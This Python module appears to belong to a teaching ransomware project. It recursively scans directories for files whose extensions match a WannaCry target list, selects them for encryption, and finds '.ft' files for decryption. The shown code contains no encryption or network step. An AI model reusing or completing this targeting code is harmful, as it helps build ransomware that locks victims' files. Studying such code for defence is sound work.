from os import listdir, system
from os.path import isdir, isfile, splitext
from time import sleep

banner = """
        ################################################################################
        ################################################################################
        #   ;;;;; ;;;;;;;  ;;;;    ;;;;;  ;;;  ;;; ;;;  ;;;   ;;;;   ;;;    ;;;;  ;;;; #
        #  ;;;;;; ;;;;;;; ;;;;;;  ;;;;;;; ;;; ;;;  ;;;  ;;;  ;;;;;;  ;;;    ;;;;  ;;;; #
        # ;;;       ;;;  ;;;  ;;; ;;; ;;; ;;; ;;;  ;;;  ;;; ;;;  ;;; ;;;    ;;;;  ;;;; #
        #  ;;;;;    ;;;  ;;;  ;;; ;;;     ;;;;;;   ;;;;;;;; ;;;  ;;; ;;;    ;; ;;;;;;; #
        #  ;;;;;;;  ;;;  ;;;  ;;; ;;;     ;;;;;;   ;;;;;;;; ;;;  ;;; ;;;    ;; ;;;; ;; #
        #     ;;;;  ;;;  ;;;  ;;; ;;; ;;; ;;;;;;;  ;;;  ;;; ;;;  ;;; ;;;    ;; ;;;; ;; #
        # ;;;  ;;;  ;;;  ;;;  ;;; ;;;;;;; ;;; ;;;  ;;;  ;;; ;;;  ;;; ;;;;;; ;; ;;;; ;; #
        #  ;;;;;;   ;;;   ;;;;;;   ;;;;;  ;;;  ;;; ;;;  ;;;  ;;;;;;  ;;;;;; ;; ;;;; ;; #
        #   ;;;;    ;;;    ;;;;     ;;;   ;;;  ;;; ;;;  ;;;   ;;;;   ;;;;;; ;;  ;;  ;; #
        ################################################################################
        ################################################################################
                                                                    github.com/goldcod3"""
# Diccionario de extensiones afectadas por Wannacry
src_dic = set()
# Referencias de archivos error en cifrado y descifrado
encrypt_dir = []
decrypt_dir = []
error_files = []

# Funcion que carga diccionario de extensiones en conjunto 'src_dic'
def get_dictionary(silent=False):
    try:
        with open("dic_wcry.txt","r") as dic_wcry:
            for ext in dic_wcry:
                src_dic.add(ext.replace('\n',""))
        return True
    # Captura de error al leer diccionario
    except:
        if silent == False:
            print("ERROR READ DICTIONARY!")
        return False

# Funcion Verbose - Salida por consola
def print_scan(lst_dir=None):
    system('clear')
    print(banner)
    sleep(2)
    system('clear')
    print("""
        **************************************
        *|         SCANNING FILES!!!        |*
        **************************************\n""")
    sleep(0.5)
    print("""*** SCANNING RESULT ***
    """)
    num_files = 0
    num_directories = 0
    num_error = 0
    for dir in lst_dir:
        num_directories = num_directories+1
        for d,file in dir.items():
            sleep(0.2)
            print("* DIRECTORY AFFECTED --> {}".format(d))
            for f in file:
                num_files = num_files+1  
                sleep(0.2)
                print("[*]-- FILE AFFECTED   --> {:>35}".format(f.replace(d+'/',"")))
        print()
    for file in error_files:
                print("[X]-- ERROR FILE - NO AFECTED   --> {:>35}".format(file))
                num_error = num_error+1
                sleep(0.2)
    print()
    print("""-_- DIRECTORIES AFFECTED -_-
    {}""".format(num_directories))
    print("""-*- FILES AFFECTED -*-
    {}""".format(num_files))
    print("""-X- ERROR FILES - NO AFFECTED -*-
    {}""".format(num_error))
    sleep(4)
    system('clear')

# Funcion de listado/escaneo de Directorio y Subdirectorios a cifrar
def scan_encrypt_dirs(dir=None, silent=False):
    try:
        files = []
        # Escaneo de directorios
        for obj in listdir(dir):
            if isfile(dir+'/'+obj):
                file, ext = splitext(dir+'/'+obj)
                # Verificacion de extension [Diccionario Cargado]
                if ext in src_dic: 
                    files.append(dir+'/'+obj)
                else:
                    error_files.append(dir+'/'+obj)
                del file     
        directory = {dir:files}
        encrypt_dir.append(directory)
        # Escaneo de subdirectorios
        for obj in listdir(dir):
            if isdir(dir+'/'+obj):
                scan_encrypt_dirs(dir+'/'+obj)
    # Captura excepcion al leer directorio
    except Exception:
        if silent == False:
            print("ERROR READ DIRECTORY -> {}".format(dir))
            sleep(0.2)

# Funcion de listado/escaneo de Directorio y Subdirectorios a descifrar
def scan_decrypt_dirs(dir=None,silent=False):
    try:
        files = []
        for obj in listdir(dir):
            if isfile(dir+"/"+obj):
                f,ext = splitext(obj)
                if ext == '.ft':
                    files.append(dir+'/'+obj)
        directory = {dir:files}
        decrypt_dir.append(directory)
        for obj in listdir(dir):
            if isdir(dir+'/'+obj):
                scan_decrypt_dirs(dir+'/'+obj)
    # Captura excepcion al leer directorio
    except Exception:
        if silent == False:
            print("ERROR READ DIRECTORY -> {}".format(dir))
            sleep(0.2)

# Funcion de inicio de cifrado
def scan_encrypt(dir=None,silent=False):
    if get_dictionary(silent=silent):
        scan_encrypt_dirs(dir,silent=silent)
        if silent == False:
            print_scan(encrypt_dir)
        return encrypt_dir

# Funcion de inicio de descifrado
def scan_decrypt(dir=None,silent=False):
    scan_decrypt_dirs(dir,silent=silent)
    if silent == False:
            print_scan(decrypt_dir)
    return decrypt_dir